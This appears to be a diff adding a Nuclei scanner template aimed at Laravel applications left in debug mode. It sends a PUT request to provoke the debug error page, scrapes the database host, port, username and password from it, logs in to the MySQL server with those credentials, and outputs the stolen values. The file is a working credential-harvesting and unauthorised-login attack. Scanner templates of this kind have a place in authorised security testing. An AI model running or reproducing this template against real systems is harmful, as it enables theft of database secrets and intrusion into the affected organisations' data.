@@ -1,0 +1,74 @@
+id: laravel-debug-error-dbpass
+
+info:
+  name: laravel-debug-error-dbpass
+  author: laravel-debug-error-dbpass
+  severity: high
+
+
+http:
+  - raw:
+      - |
+        PUT /index.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_all(body,"DB_USERNAME","DB_PASSWORD")
+
+
+    extractors:
+      - type: xpath
+        name: DB_USERNAME
+        part: body
+        internal: true
+        xpath:
+          - //td[text()="DB_USERNAME"]/following-sibling::td/pre/span/text()
+
+
+      - type: xpath
+        name: DB_PASSWORD
+        part: body
+        internal: true
+        xpath:
+          - //td[text()="DB_PASSWORD"]/following-sibling::td/pre/span/text()
+
+
+      - type: xpath
+        name: DB_HOST
+        part: body
+        internal: true
+        xpath:
+          - //td[text()="DB_HOST"]/following-sibling::td/pre/span/text()
+
+      - type: xpath
+        name: DB_PORT
+        part: body
+        internal: true
+        xpath:
+          - //td[text()="DB_PORT"]/following-sibling::td/pre/span/text()
+
+javascript:
+  - code: |
+      let m = require('nuclei/mysql');
+      let c = m.MySQLClient();
+      c.Connect( dbhost, dbport, dbuser,dbpass);
+
+    args:
+      dbhost: "{{DB_HOST}}"
+      dbport: "{{DB_PORT}}"
+      dbuser: "{{DB_USERNAME}}"
+      dbpass: "{{DB_PASSWORD}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - response == true
+          - success == true
+        condition: and
+
+    extractors:
+      - type: dsl
+        dsl:
+          - http_host,javascript_DB_HOST,javascript_DB_PORT,javascript_DB_USERNAME,javascript_DB_PASSWORD
